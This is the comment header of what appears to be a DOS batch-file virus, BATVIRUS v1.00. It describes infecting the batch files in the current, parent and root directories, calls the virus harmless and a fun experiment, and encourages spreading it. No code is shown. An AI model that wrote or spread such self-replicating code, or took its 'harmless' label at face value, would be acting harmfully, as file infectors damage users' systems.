rem *                  This is BATVIRUS v 1.00                    *		
rem * This BATVIRUS is harmless and completely transparent.  When *		
rem * executed,  it  will  infect any batch files  in the current *		
rem *  + one up + root directory. BATVIRUS requies MS-DOS 5.00 or *		
rem * compatible,  the pipe find, the file  attrib.exe  and a few *		
rem * free bytes on your hard drive.                              *		
rem * It was created as a fun experiment. You can spread it freely*		
rem * on your own machine. Comments are much appreciated.         *
